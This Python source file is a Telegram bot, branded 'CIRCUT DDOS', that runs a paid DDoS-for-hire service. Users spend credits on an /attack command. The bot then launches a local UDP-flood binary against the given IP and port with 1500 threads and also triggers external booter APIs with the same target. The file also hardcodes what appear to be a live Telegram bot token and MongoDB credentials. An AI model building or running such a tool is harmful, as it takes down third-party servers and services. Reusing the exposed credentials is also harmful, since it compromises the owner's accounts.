import os
import telebot
import requests
import logging
import time
from pymongo import MongoClient
import certifi
from threading import Thread, Lock
import asyncio
from telebot import types
import subprocess

# --- INITIALIZATION ---
attack_loop = asyncio.new_event_loop()
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# --- CONFIGURATION ---
TOKEN = '8754814217:AAEIszWu7k_J3-7qivDV21i4B4i5Bq2bmw4'
MONGO_URI = 'mongodb+srv://ddos62366_db_user:cYaNxOHsNl5mpvA8@cluster0.1bfayzm.mongodb.net/?appName=Cluster0'
PRIMARY_ADMIN = 8318925500 
BINARY_NAME = "./bgmi"

bot = telebot.TeleBot(TOKEN)

# MongoDB Setup
try:
    client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
    db = client['danger']
    users_collection = db.users
    api_collection = db.apis 
    admins_collection = db.admins 
    settings_collection = db.settings
except Exception as e:
    exit(1)

active_attacks = [] 
attack_lock = Lock()
DEFAULT_THREADS = 1500 

# --- HELPERS ---
def get_settings():
    settings = settings_collection.find_one({"id": "bot_settings"})
    if not settings:
        default = {"id": "bot_settings", "max_time": 300, "total_slots": 1}
        settings_collection.insert_one(default)
        return default
    return settings

def create_inline_keyboard():
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("❤️ Join Our Channel", url="https://t.me/+-IX58oAPzeoyODll"))
    markup.add(types.InlineKeyboardButton("👤 Contact Owner", url="https://t.me/Circutowner"))
    return markup

# --- ATTACK ENGINE (ACCURATE SLOTS) ---
async def run_attack_task(chat_id, ip, port, dur, atk_id):
    global active_attacks
    cmd = f"chmod +x {BINARY_NAME} && {BINARY_NAME} {ip} {port} {dur} {DEFAULT_THREADS}"
    
    # Trigger External APIs
    for api in list(api_collection.find()):
        try: requests.get(f"https://{api['url']}/api?key={api['key']}&host={ip}&port={port}&time={dur}", timeout=4)
        except: pass

    try:
        process = subprocess.Popen(cmd, shell=True)
        await asyncio.sleep(dur)
        process.terminate()
    finally:
        with attack_lock:
            if atk_id in active_attacks:
                active_attacks.remove(atk_id) # Slot free karke update karega
        bot.send_message(chat_id, "✅ *ATTACK FINISHED!*", reply_markup=create_inline_keyboard(), parse_mode='Markdown')

# --- COMMANDS ---

@bot.message_handler(commands=['start', 'help'])
def help_command(message):
    help_text = (
        "🌟 *CIRCUT DDOS COMMANDS* 🌟\n\n"
        "🚀 `/attack ip port time` - Launch\n"
        "📊 `/status` - Check Slots\n"
        "👤 `/myinfo` - Credits Check\n"
        "👑 `/maxtime time` - Set Limit\n"
        "🎰 `/addslot num` - Set Slots"
    )
    bot.send_message(message.chat.id, help_text, reply_markup=create_inline_keyboard(), parse_mode='Markdown')

@bot.message_handler(commands=['status'])
def status_cmd(message):
    settings = get_settings()
    with attack_lock:
        used = len(active_attacks)
    bot.send_message(message.chat.id, f"📊 *STATUS:* {'BUSY' if used >= settings['total_slots'] else 'READY'}\n🚀 *Active Attacks:* `{used}/{settings['total_slots']}`\n⏱️ *Limit:* `{settings['max_time']}s`", parse_mode='Markdown')

@bot.message_handler(commands=['attack'])
def attack_cmd(message):
    user_id = message.from_user.id
    user_data = users_collection.find_one({"user_id": user_id})
    setts = get_settings()

    if not user_data or user_data.get('credits', 0) < 5:
        bot.send_message(message.chat.id, "🚫 *Credits Low!*", reply_markup=create_inline_keyboard())
        return

    with attack_lock:
        if len(active_attacks) >= setts['total_slots']:
            bot.send_message(message.chat.id, "⚠️ *All Slots Full!*", reply_markup=create_inline_keyboard())
            return

    args = message.text.split()
    if len(args) != 4:
        bot.send_message(message.chat.id, "❌ *Usage:* `/attack ip port time`", parse_mode='Markdown')
        return

    try:
        ip, port, dur = args[1], int(args[2]), int(args[3])
        if dur > setts['max_time']:
            bot.send_message(message.chat.id, f"❌ *Max time: {setts['max_time']}s*")
            return

        users_collection.update_one({"user_id": user_id}, {"$inc": {"credits": -5}})
        atk_id = f"{ip}_{port}_{time.time()}"
        
        with attack_lock:
            active_attacks.append(atk_id) # Slot occupy ho gaya

        # BOX DESIGN MESSAGE
        box_msg = (
            f"```\n"
            f"╔══════════════════════════════════════╗\n"
            f"║          ⚡ ATTACK STARTED ⚡         ║\n"
            f"╠══════════════════════════════════════╣\n"
            f"║  🎯 Target:  {ip:<23} ║\n"
            f"║  🔌 Port:    {port:<23} ║\n"
            f"║  ⏱️ Time:    {dur:<23} ║\n"
            f"║  🛠️ Method:  UDP Flood               ║\n"
            f"╚══════════════════════════════════════╝\n"
            f"```"
        )
        bot.send_message(message.chat.id, box_msg, parse_mode='Markdown')
        asyncio.run_coroutine_threadsafe(run_attack_task(message.chat.id, ip, port, dur, atk_id), attack_loop)
    except:
        bot.send_message(message.chat.id, "⚠️ Invalid input.")

@bot.message_handler(commands=['maxtime', 'addslot'])
def admin_settings(message):
    if message.from_user.id != PRIMARY_ADMIN: return
    args = message.text.split()
    try:
        val = int(args[1])
        key = "max_time" if "maxtime" in message.text else "total_slots"
        settings_collection.update_one({"id": "bot_settings"}, {"$set": {key: val}}, upsert=True)
        bot.send_message(message.chat.id, f"✅ {key} updated to `{val}`")
    except: pass

# --- RUNNER ---
def main():
    def start_loop():
        asyncio.set_event_loop(attack_loop)
        attack_loop.run_forever()
    Thread(target=start_loop, daemon=True).start()
    bot.infinity_polling()

if __name__ == "__main__":
    main()
